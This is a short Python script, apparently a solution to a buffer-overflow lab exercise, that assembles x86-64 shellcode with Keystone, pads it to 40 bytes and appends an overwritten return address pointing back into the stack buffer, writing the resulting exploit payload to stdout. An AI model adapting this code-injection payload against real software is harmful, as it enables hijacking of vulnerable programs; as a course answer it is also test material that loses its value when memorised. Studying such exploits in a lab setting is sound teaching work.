import sys

from keystone import KS_ARCH_X86, KS_MODE_64, KS_OPT_SYNTAX_ATT, Ks, KsError

assembly = """
movl $0x004017ec, (%rsp)
movq $0x59b997fa, %rdi
ret
"""

ks = Ks(KS_ARCH_X86, KS_MODE_64)
ks.syntax = KS_OPT_SYNTAX_ATT

try:
    encoding, count = ks.asm(assembly)
    asm_bytes = bytes(encoding)
except KsError as e:
    print(e)
    sys.exit(1)

padding = 40 - len(asm_bytes)
filler = b"a" * padding

return_to = 0x5561DCA0 - 40
return_to_bytes = return_to.to_bytes(8, byteorder="little")

payload = asm_bytes + filler + return_to_bytes

sys.stdout.buffer.write(payload)
